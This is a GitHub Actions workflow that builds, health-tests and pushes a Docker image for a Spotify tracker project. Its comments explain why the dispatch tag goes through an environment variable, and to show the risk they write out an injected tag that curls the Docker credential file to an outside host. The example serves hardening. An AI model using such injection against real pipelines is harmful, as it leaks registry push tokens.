name: Docker push tag

on:
  workflow_dispatch:
    inputs:
      target_tag:
        description: 'Exact tag to build (e.g., v1.0.0)'
        required: true
        type: string

# The image is pushed with Docker Hub credentials, so GITHUB_TOKEN only ever
# needs to read the checkout - without this it inherits the repository default,
# which can be write-all.
permissions:
  contents: read

jobs:
  build-test-push:
    runs-on: ubuntu-latest
    # The dispatch input reaches the shells as an ENVIRONMENT VARIABLE, never as
    # ${{ }} inside a `run:` block. Expression syntax is substituted textually
    # before bash parses the line, so a tag of `v1 ; curl -d @$HOME/.docker/
    # config.json https://...` would execute - and the Docker Hub login step runs
    # first, so that file holds a live push token. Only someone with repo write
    # access can dispatch this, so it is hardening rather than an open hole, but
    # it is the pattern actionlint and CodeQL flag and there is no reason to keep it.
    env:
      TARGET_TAG: ${{ inputs.target_tag }}

    steps:
    - name: Checkout repository
      uses: actions/checkout@v7
      with:
        ref: ${{ inputs.target_tag }}

    - name: Log in to Docker Hub
      uses: docker/login-action@v4
      with:
        username: ${{ secrets.DOCKERHUB_USERNAME }}
        password: ${{ secrets.DOCKERHUB_TOKEN }}

    - name: Build the Docker image
      run: |
        docker build --no-cache -t "i7gamer/spotify-tracker:$TARGET_TAG" .

    - name: Test container startup and health
      run: |
        echo "Starting container..."
        docker run -d --name test-tracker "i7gamer/spotify-tracker:$TARGET_TAG"
        
        # Check if the image has a healthcheck defined
        HAS_HEALTHCHECK=$(docker inspect -f '{{if .Config.Healthcheck}}yes{{else}}no{{end}}' test-tracker)
        
        if [ "$HAS_HEALTHCHECK" == "yes" ]; then
          echo "Healthcheck found. Waiting up to 60 seconds for healthy status..."
          TIMEOUT=60
          ELAPSED=0
          
          while [ $ELAPSED -le $TIMEOUT ]; do
            STATUS=$(docker inspect -f '{{.State.Health.Status}}' test-tracker)
            
            if [ "$STATUS" == "healthy" ]; then
              echo "Container is stable and healthy."
              exit 0
            elif [ "$STATUS" == "unhealthy" ]; then
              echo "Container reported unhealthy status. Aborting push."
              docker logs test-tracker
              exit 1
            fi
            
            echo "Waiting for healthcheck (current status: $STATUS)..."
            sleep 5
            ELAPSED=$((ELAPSED + 5))
          done
          
          echo "Timeout reached waiting for container health."
          docker logs test-tracker
          exit 1
        else
          echo "No healthcheck found in this image. Executing fallback runtime check..."
          echo "Waiting 15 seconds to ensure container does not crash on startup..."
          sleep 15
          
          # Query the basic Docker container status
          STATUS=$(docker inspect -f '{{.State.Status}}' test-tracker)
          
          if [ "$STATUS" == "running" ]; then
            echo "Container is still running. Considering it stable."
            exit 0
          else
            echo "Container exited unexpectedly (Status: $STATUS). Aborting push."
            docker logs test-tracker
            exit 1
          fi
        fi

    - name: Push Docker image
      run: |
        echo "Pushing image..."
        docker push "i7gamer/spotify-tracker:$TARGET_TAG"
